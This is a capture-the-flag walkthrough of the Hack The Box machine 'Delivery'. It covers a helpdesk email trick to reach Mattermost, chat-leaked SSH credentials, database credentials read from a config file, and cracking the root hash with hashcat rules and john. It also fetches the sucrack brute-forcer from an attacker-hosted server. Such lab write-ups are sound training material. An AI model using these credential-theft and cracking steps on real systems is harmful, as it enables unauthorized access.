@@ -1,0 +1,142 @@
+Delivery
+
+ 21th May 2021 / Document No. D21.100.119
+ Prepared By: felamos
+ Machine Author: ippsec
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+Delivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is
+possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a
+temporary company email. This "feature" permits the registration at MatterMost and the join of internal
+team channel. It is revealed through that channel that users have been using same password variant
+"PleaseSubscribe!" for internal access. In channel it is also disclosed the credentials for the mail user which
+can give the initial foothold to the system. While enumerating the file system we come across the
+mattermost configuration file which reveals MySQL database credentials. By having access to the database
+a password hash can be extracted from Users table and crack it using the "PleaseSubscribe!" pattern. After
+cracking the hash it is possible to login as user root.
+
+Skills Required
+
+      Basic web enumeration
+      Brute force
+
+Skills Learned
+
+      Email impersonation
+      Intermediate password cracking
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.222 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.222
+
+Nmap reveals three running services, SSH at port 22, a web server at the 80 port and an unknown service at
+8065.
+Browsing to http://10.10.10.222 reveals a "Delivery" landing page.
+Frontend looks like a static HTML page but HELPDESK link redirects to http://helpdesk.delivery.htb/ .
+We should add the above hostname at the /etc/hosts file on our local machine.
+
+   10.10.10.222 delivery.htb helpdesk.delivery.htb
+
+Furthermore the link for Contact Us instructs unregistered users to contact HelpDesk. By using a valid
+"company" email then it will be possible to access the MatterMost server.
+Indeed though for mattermost open registration seems possible.
+Visiting helpdesk subdomain shows that its running the support ticketing sytem osTicket.
+Foothold
+
+HelpDesks usually allow users to email to a temporary email address provided by HelpDesks to update the
+status of an open ticket. If though the corporate domain is used for tickets, this "feature" allows non-
+employee users to have access to @Company.com email addresses. Many cloud services take email
+addresses as "proof of employment" and may grant access to internal services like GitHub, Slack,
+Confluence, etc. Lets try to create a new Ticket.
+
+After hitting the "Create Ticket" button, it will redirect us to a success page if all provided information is
+correct.
+
+Upon the creation of a support ticket, a company email @delivery.htb will be created for us. We can sign
+up for a new user using the email we got from the support ticket.
+We now check if there is something on our support ticket status.
+
+Indeed we have been invited. By visiting the confirmation URL we gain access to the MatterMost instance
+and finally join the Internal team. More information about TicketTrick attack can be found here.
+
+It seems that internal team is talking about updating the theme on the OSTicket system and team members
+also provide some credentials maildeliverer:Youve_G0t_Mail! . Furthermore they are talking about the
+creation of a program which can help them to stop re-using the same passwords everywhere, Especially
+those that are a variant of "PleaseSubscribe!" as hint. We can login through ssh as user
+maildeliverer and using the above credentials.
+
+   ssh maildeliverer@10.10.10.222
+Privilege Escalation
+
+While enumerating file system a MatterMost config file can be found at
+/opt/mattermost/config/config.json . It is possible to spot SqlSettings by reviewing it and read
+credentials for the database.
+
+   cat /opt/mattermost/config/config.json
+
+          "SqlSettings": {
+                 "DriverName": "mysql",
+                 "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?
+
+   charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+                 "DataSourceReplicas": [],
+                 "DataSourceSearchReplicas": [],
+                 "MaxIdleConns": 20,
+                 "ConnMaxLifetimeMilliseconds": 3600000,
+                 "MaxOpenConns": 300,
+                 "Trace": false,
+                 "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+                 "QueryTimeout": 30,
+                 "DisableDatabaseSearch": false
+
+          },
+
+We can now login into mysql database mattermost using the mmuser:Crack_The_MM_Admin_PW
+credentials.
+
+   mysql -u mmuser -p
+   use mattermost;
+By further enumerating database it is possible to get a root hash from Users table.
+   select * from Users;
+
+From our previous access to internal team we recall that root user on MatterMost warned about not re-
+using the password including word "PleaseSubscribe!".
+
+   PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes,
+   they can use hashcat rules to easily crack all variations of common words or phrases.
+We can generate a wordlist based on word "PleaseSubscribe!" using hashcat and use john to crack the
+root hash.
+
+   echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout
+
+It will generate a very small wordlist which can be saved inside a file called wordlist .
+   john root_hash --wordlist=wordlist
+
+Finally it is now possible to use su to login as user root on the target machine.
+   su root
+There is also another way to escalate to root. It doesn't involve getting the root hash from mysql database
+but to generate a list of candidate passwords based on PleaseSubscribe! word with the best64.rule
+using the tool hashcat and then use sucrack to brute force the right password for the user root on the
+system. The source code of sucrack can be found at Github. First we need to clone it into our own
+machine and then we can upload it to target machine and compile it there.
+
+   git clone https://github.com/hemp3l/sucrack
+   rm -rf sucrack/.git/
+   zip sucrack.zip -r sucrack/
+
+We can start a simple python server python3 -m http.server 80 and download inside the machine.
+   wget 10.10.14.4/sucrack.zip
+   unzip sucrack.zip
+We compile the source code.
+
+   cd /dev/shm/sucrack/
+   ./configure
+   make
+After compilation, binary can be found at the src folder. In our case at /dev/shm/sucrack/src/sucrack .
+We also download the wordlist from our machine that we use to crack the password.
+
+   /dev/shm/sucrack/src/sucrack -a -w 20 -s 10 -u root -rl AFLafld /dev/shm/wordlist
+
